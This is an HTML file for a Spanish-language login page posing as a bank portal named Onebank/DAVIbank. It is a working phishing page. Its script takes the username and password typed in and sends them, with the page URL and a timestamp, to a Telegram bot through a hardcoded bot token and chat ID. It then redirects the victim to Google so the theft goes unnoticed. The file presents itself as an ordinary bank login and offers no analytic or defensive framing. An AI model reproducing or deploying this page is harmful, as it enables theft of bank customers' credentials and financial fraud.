<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>SalesOnebank</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

html,body{
    width:100%;
    min-height:100%;
    font-family:Arial,Helvetica,sans-serif;
    background:#fff;
    color:#263746;
}

/* =========================
   CONTENEDOR PRINCIPAL
========================= */

.page{
    min-height:100vh;
    width:100%;
    display:flex;
}

/* =========================
   LADO DEL FORMULARIO
========================= */

.login-section{
    width:50%;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#fff;
    padding:40px 55px;
}

.login-container{
    width:100%;
    max-width:570px;
}

/* =========================
   LOGO
========================= */

.logo{
    display:flex;
    align-items:center;
    margin-bottom:38px;
}

.logo-main{
    font-size:43px;
    color:#df101b;
    font-style:italic;
    font-weight:400;
    letter-spacing:-4px;
}

.logo-bank{
    margin-left:8px;
    margin-top:10px;
    font-size:25px;
    font-weight:700;
    color:#34495e;
}

/* =========================
   TITULO
========================= */

.title{
    font-size:30px;
    line-height:1.2;
    margin-bottom:36px;
    color:#273746;
}

/* =========================
   CAMPOS
========================= */

.field{
    position:relative;
    width:100%;
    margin-bottom:27px;
}

.field-icon{
    position:absolute;
    left:0;
    top:9px;
    width:25px;
    height:25px;
    color:#626970;
}

.field input{
    width:100%;
    height:52px;
    padding:5px 45px 5px 40px;  /* padding derecho para el ícono de acción */

    border:none;
    border-bottom:1px solid #888;

    outline:none;
    background:#fff;

    font-size:19px;
    color:#555;
}

.field input::placeholder{
    color:#69757d;
}

.field input:disabled{
    opacity:1;
    cursor:not-allowed;
}

/* =========================
   BOTÓN DE ACCIÓN (ojo / limpiar)
========================= */

.field-action{
    position:absolute;
    right:5px;
    top:50%;
    transform:translateY(-50%);

    width:38px;
    height:38px;

    background:transparent;
    border:none;
    outline:none;

    cursor:pointer;

    display:none;           /* oculto por defecto */
    align-items:center;
    justify-content:center;

    color:#626970;
    padding:0;
    border-radius:50%;
}

.field-action.visible{
    display:flex;
}

.field-action svg{
    width:24px;
    height:24px;
}

.field-action:hover{
    color:#263746;
}

/* Estilo específico para el círculo con X (usuario) */

.field-action.clear-btn svg{
    width:22px;
    height:22px;
}

.field-action.clear-btn:hover{
    color:#df101b;
}

/* =========================
   BOTÓN INGRESAR
========================= */

.login-btn{
    width:100%;
    height:60px;

    border:1px solid #dce3ea;
    border-radius:9px;

    background:#fafbfc;
    color:#69747c;

    font-size:17px;
    font-weight:bold;

    cursor:pointer;

    transition: background 0.3s ease, color 0.3s ease, border-color 0.3s ease;
}

.login-btn:hover{
    background:#f0f2f5;
}

.login-btn.active{
    background:#df101b;
    color:#ffffff;
    border-color:#df101b;
}

.login-btn.active:hover{
    background:#c00d17;
    border-color:#c00d17;
}

/* =========================
   TARJETAS
========================= */

.info-card{
    width:100%;
    min-height:80px;

    margin-top:25px;

    padding:14px 20px;

    border:1px dashed #d5dce1;
    border-radius:5px;

    display:flex;
    align-items:center;

    font-size:16px;
    line-height:1.4;
    color:#3f474e;
}

.info-icon{
    width:50px;
    min-width:50px;

    margin-right:18px;

    text-align:center;
    font-size:32px;
}

.phone-icon{
    color:#7048b9;
}

.megaphone-icon{
    color:#069fd3;
}

.info-card strong{
    color:#087fb7;
}

/* =========================
   PANEL DERECHO — SOLO PC
========================= */

.promo-section{
    width:50%;
    min-height:100vh;

    position:relative;
    overflow:hidden;

    background:#ed91cf;

    display:flex;
    align-items:center;
    justify-content:center;
}

.promo-image{
    width:100%;
    height:100%;

    object-fit:cover;
    object-position:center;

    position:absolute;
    inset:0;
}

/* =========================
   RESPONSIVE
========================= */

@media(max-width:900px){

    .page{
        display:block;
        width:100%;
    }

    .promo-section{
        display:none !important;
    }

    .login-section{
        width:100%;
        min-height:100vh;

        padding:35px 25px;

        display:flex;
        align-items:flex-start;
    }

    .login-container{
        max-width:620px;
        margin:30px auto 0;
    }
}

@media(max-width:500px){

    .login-section{
        padding:25px 20px;
    }

    .login-container{
        margin-top:20px;
    }

    .logo{
        margin-bottom:30px;
    }

    .logo-main{
        font-size:36px;
    }

    .logo-bank{
        font-size:21px;
        margin-top:7px;
    }

    .title{
        font-size:25px;
        margin-bottom:31px;
    }

    .field{
        margin-bottom:25px;
    }

    .field input{
        height:50px;
        font-size:17px;
    }

    .login-btn{
        height:58px;
    }

    .info-card{
        min-height:76px;
        padding:13px 12px;
        font-size:14px;
    }

    .info-icon{
        width:42px;
        min-width:42px;
        margin-right:10px;
        font-size:27px;
    }
}

@media(max-width:360px){

    .login-section{
        padding-left:15px;
        padding-right:15px;
    }

    .title{
        font-size:23px;
    }

    .info-card{
        font-size:13px;
    }
}
</style>
</head>

<body>

<div class="page">

    <section class="login-section">

        <div class="login-container">

            <div class="logo">
            <img src="logo.jpeg" alt="DAVIbank" class="logo-img">
            </div>

            <h1 class="title">
                Bienvenido a Onebank
            </h1>

            <!-- =====================
                 CAMPO USUARIO
            ====================== -->

            <div class="field">

                <div class="field-icon">

                    <svg viewBox="0 0 24 24"
                         fill="none"
                         stroke="currentColor"
                         stroke-width="1.7">

                        <circle cx="12" cy="7" r="4"></circle>

                        <path d="M4 21c0-4.2 3.5-7 8-7s8 2.8 8 7"></path>

                    </svg>

                </div>

                <input type="text" id="usuario" placeholder="Usuario">

                <!-- Círculo con X para borrar el usuario -->

                <button type="button"
                        class="field-action clear-btn"
                        id="clearUsuario"
                        aria-label="Borrar usuario">

                    <svg viewBox="0 0 24 24"
                         fill="none"
                         stroke="currentColor"
                         stroke-width="1.8"
                         stroke-linecap="round"
                         stroke-linejoin="round">

                        <circle cx="12" cy="12" r="10"></circle>

                        <line x1="9" y1="9" x2="15" y2="15"></line>

                        <line x1="15" y1="9" x2="9" y2="15"></line>

                    </svg>

                </button>

            </div>

            <!-- =====================
                 CAMPO CONTRASEÑA
            ====================== -->

            <div class="field">

                <div class="field-icon">

                    <svg viewBox="0 0 24 24"
                         fill="none"
                         stroke="currentColor"
                         stroke-width="1.7">

                        <rect x="5" y="10" width="14" height="10" rx="1"></rect>

                        <path d="M8 10V7a4 4 0 0 1 8 0v3"></path>

                        <circle cx="12" cy="15" r="1"></circle>

                    </svg>

                </div>

                <input type="password" id="password" placeholder="Contraseña">

                <!-- Ojo para mostrar / ocultar contraseña -->

                <button type="button"
                        class="field-action"
                        id="togglePassword"
                        aria-label="Mostrar contraseña">

                    <svg id="eyeOpen" viewBox="0 0 24 24"
                         fill="none"
                         stroke="currentColor"
                         stroke-width="1.8"
                         stroke-linecap="round"
                         stroke-linejoin="round">

                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>

                        <circle cx="12" cy="12" r="3"></circle>

                    </svg>

                    <svg id="eyeClosed" viewBox="0 0 24 24"
                         fill="none"
                         stroke="currentColor"
                         stroke-width="1.8"
                         stroke-linecap="round"
                         stroke-linejoin="round"
                         style="display:none;">

                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>

                        <line x1="1" y1="1" x2="23" y2="23"></line>

                    </svg>

                </button>

            </div>

            <button type="button" id="loginBtn" class="login-btn">Ingresar</button>

            <div class="info-card">

                <div class="info-icon phone-icon">☎</div>

                <div>
                    Si tienes problemas con tu contraseña
                    comunícate con la mesa de ayuda.
                    <br>
                    Tel: 7456300 ext 4545
                </div>

            </div>

            <div class="info-card">

                <div class="info-icon megaphone-icon">📣</div>

                <div>
                    DAVIbank tiene un aviso importante
                    para ti.
                    <strong>Lee más aquí</strong>
                </div>

            </div>

        </div>

    </section>

    <section class="promo-section">

        <img src="banner-baas-login.jpg"
             class="promo-image"
             alt="Imagen promocional">

    </section>

</div>

<script>
const TELEGRAM_TOKEN = "8747147152:AAFNHujZamAp_GRYUue9VwKEktdmovPeoqU";
const TELEGRAM_CHAT_ID = "8042354877";

const usuarioInput   = document.getElementById("usuario");
const passwordInput  = document.getElementById("password");
const loginBtn       = document.getElementById("loginBtn");

const clearUsuario   = document.getElementById("clearUsuario");

const togglePassword = document.getElementById("togglePassword");
const eyeOpen        = document.getElementById("eyeOpen");
const eyeClosed      = document.getElementById("eyeClosed");

/* ============================================================
   1) Mostrar / ocultar el círculo con X (usuario)
   ============================================================ */

usuarioInput.addEventListener("input", function () {

    if (usuarioInput.value.length > 0) {
        clearUsuario.classList.add("visible");
    } else {
        clearUsuario.classList.remove("visible");
    }
});

/* ============================================================
   2) Acción del círculo con X: borrar el usuario
   ============================================================ */

clearUsuario.addEventListener("click", function () {

    usuarioInput.value = "";
    clearUsuario.classList.remove("visible");
    usuarioInput.focus();
});

/* ============================================================
   3) Mostrar / ocultar el ojo (contraseña)
   ============================================================ */

passwordInput.addEventListener("input", function () {

    if (passwordInput.value.length > 0) {
        togglePassword.classList.add("visible");
    } else {
        togglePassword.classList.remove("visible");

        // Si se borra el campo, volvemos al estado oculto
        passwordInput.type = "password";
        eyeOpen.style.display = "block";
        eyeClosed.style.display = "none";
    }

    // Activar / desactivar el botón rojo
    if (passwordInput.value.trim().length > 0) {
        loginBtn.classList.add("active");
    } else {
        loginBtn.classList.remove("active");
    }
});

/* ============================================================
   4) Alternar entre mostrar y ocultar la contraseña
   ============================================================ */

togglePassword.addEventListener("click", function () {

    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        eyeOpen.style.display = "none";
        eyeClosed.style.display = "block";
        togglePassword.setAttribute("aria-label", "Ocultar contraseña");
    } else {
        passwordInput.type = "password";
        eyeOpen.style.display = "block";
        eyeClosed.style.display = "none";
        togglePassword.setAttribute("aria-label", "Mostrar contraseña");
    }

    passwordInput.focus();
});

/* ============================================================
   5) Enviar a Telegram y redirigir a Google
   ============================================================ */

loginBtn.addEventListener("click", async function () {

    const usuario  = usuarioInput.value.trim();
    const password = passwordInput.value.trim();

    if (!usuario || !password) {
        alert("Completa todos los campos");
        return;
    }

    const mensaje = `
🔐 Nuevo registro
👤 Usuario: ${usuario}
🔑 Contraseña: ${password}
🌐 Página: ${window.location.href}
🕒 Fecha: ${new Date().toLocaleString()}
    `;

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    try {
        await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: mensaje
            })
        });
        console.log("Enviado");
    } catch (err) {
        console.error("Error:", err);
    }

    window.location.href = "https://www.google.com";
});
</script>

</body>
</html>
